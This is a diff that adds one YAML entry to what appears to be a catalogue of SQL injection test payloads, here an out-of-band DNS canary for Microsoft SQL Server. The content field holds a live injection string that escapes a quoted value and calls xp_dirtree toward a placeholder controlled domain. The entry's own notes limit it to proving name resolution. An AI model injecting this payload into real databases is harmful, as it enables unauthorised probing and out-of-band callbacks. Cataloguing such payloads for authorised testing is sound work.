@@ -1,0 +1,25 @@
+id: web-sqli-out-of-band-mssql-dns-canary-001
+schema_version: 1
+technique_id: web-sqli-out-of-band
+name: SQL Server DNS-only canary
+content: '''; EXEC master..xp_dirtree ''\\<unique-id>.<controlled-domain>\a''-- '
+target_technology: Microsoft SQL Server
+technology_versions: []
+injection_context: quoted-string
+encoding: none
+expected_behavior: On eligible SQL Server configurations with sufficient permissions and outbound name
+  resolution, this may cause a DNS lookup. A callback proves name resolution only; never place query data
+  or secrets in the hostname. High-privilege feature availability varies.
+waf_bypass_for: []
+related_payload: null
+review:
+  status: unverified
+  last_tested: null
+  tested_against: []
+  evidence: []
+references:
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-dirtree-transact-sql
+source: original
+adapted_from: null
+license: pending-policy-review
